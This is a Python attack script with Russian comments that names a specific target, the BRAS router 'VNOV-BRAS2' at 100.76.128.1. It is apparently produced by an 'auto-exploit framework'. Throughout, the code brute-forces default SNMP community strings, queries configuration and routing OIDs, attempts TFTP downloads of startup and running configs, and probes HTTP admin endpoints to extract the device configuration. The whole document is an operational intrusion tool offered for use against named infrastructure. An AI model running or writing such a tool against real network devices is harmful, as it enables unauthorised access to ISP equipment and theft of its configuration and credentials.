#!/usr/bin/env python3
"""
BRAS Configuration Extractor
Вектор атаки: Извлечение конфигурации BRAS
Цель: BRAS VNOV-BRAS2 (100.76.128.1)
Вероятность успеха: СРЕДНЯЯ
Уровень сложности: СРЕДНИЙ

Описание:
Извлечение конфигурации BRAS через SNMP community strings, TFTP и HTTP интерфейс.
Поддерживает перебор community strings и автоматическое извлечение.

Использование:
python3 bras_config_extractor.py --target 100.76.128.1

Зависимости:
pip install pysnmp

Автор: Auto-exploit framework
Дата: 2026-07-30
"""

from pysnmp.hlapi import *
import sys
import argparse
import socket
import requests

class BrasConfigExtractor:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.config_data = {}
    
    def extract_bras_config(self, community):
        """Извлечение конфигурации BRAS через SNMP"""
        
        # OID для конфигурации (пример для Cisco)
        config_oids = [
            '1.3.6.1.2.1.1.1.0',      # System description
            '1.3.6.1.2.1.2.2.1.2',    # Interface descriptions
            '1.3.6.1.4.1.9.2.1.53',   # Cisco config
            '1.3.6.1.2.1.4.20.1.1',   # IP routing table
        ]
        
        config_data = {}
        
        for oid in config_oids:
            try:
                error_indication, error_status, error_index, var_binds = next(
                    getCmd(SnmpEngine(),
                          CommunityData(community),
                          UdpTransportTarget((self.target_ip, 161)),
                          ContextData(),
                          ObjectType(ObjectIdentity(oid)))
                )
                
                if error_indication:
                    continue
                elif error_status:
                    continue
                else:
                    for var_bind in var_binds:
                        config_data[oid] = str(var_bind[1])
                        
            except Exception as e:
                continue
        
        return config_data
    
    def brute_snmp_community(self):
        """Перебор SNMP community strings"""
        communities = ['public', 'private', 'cisco', 'admin', 'manager', 'read', 'write']
        
        print(f"[*] Перебор SNMP community strings для {self.target_ip}")
        
        for community in communities:
            print(f"[*] Пробуем community: {community}")
            config = self.extract_bras_config(community)
            if config:
                print(f"[+] Успешно с community: {community}")
                self.config_data = config
                return config
        
        return None
    
    def attempt_tftp_download(self):
        """Попытка скачивания конфигурации через TFTP"""
        print(f"[*] Попытка TFTP download для {self.target_ip}")
        
        config_files = ['config.txt', 'startup-config', 'running-config', 'backup-config']
        
        for filename in config_files:
            try:
                # Попытка TFTP (требует tftp клиент)
                import subprocess
                result = subprocess.run(['tftp', self.target_ip, '-c', 'get', filename],
                                      capture_output=True, timeout=5)
                if result.returncode == 0:
                    print(f"[+] Успешно скачан: {filename}")
                    return filename
            except:
                continue
        
        return None
    
    def attempt_http_config(self):
        """Попытка извлечения конфигурации через HTTP"""
        print(f"[*] Попытка HTTP config extraction для {self.target_ip}")
        
        endpoints = ['/config', '/api/v1/config', '/admin/config', '/running-config']
        
        for endpoint in endpoints:
            try:
                url = f"http://{self.target_ip}{endpoint}"
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Доступ к конфигурации: {url}")
                    return response.text
            except:
                continue
        
        return None
    
    def extract_all(self):
        """Комплексное извлечение конфигурации"""
        print(f"[*] Комплексное извлечение конфигурации BRAS")
        
        # SNMP
        snmp_config = self.brute_snmp_community()
        if snmp_config:
            print(f"[+] SNMP конфигурация извлечена")
        
        # TFTP
        tftp_file = self.attempt_tftp_download()
        if tftp_file:
            print(f"[+] TFTP конфигурация извлечена: {tftp_file}")
        
        # HTTP
        http_config = self.attempt_http_config()
        if http_config:
            print(f"[+] HTTP конфигурация извлечена")
        
        return self.config_data

def main():
    parser = argparse.ArgumentParser(description='BRAS Configuration Extractor')
    parser.add_argument('--target', required=True, help='Target BRAS IP address')
    
    args = parser.parse_args()
    
    print(f"[*] BRAS Configuration Extractor")
    print(f"[*] Target: {args.target}")
    
    extractor = BrasConfigExtractor(args.target)
    config = extractor.extract_all()
    
    if config:
        print(f"[+] Конфигурация извлечена успешно")
        for oid, value in config.items():
            print(f"    {oid}: {value}")
    else:
        print(f"[-] Не удалось извлечь конфигурацию")

if __name__ == "__main__":
    main()
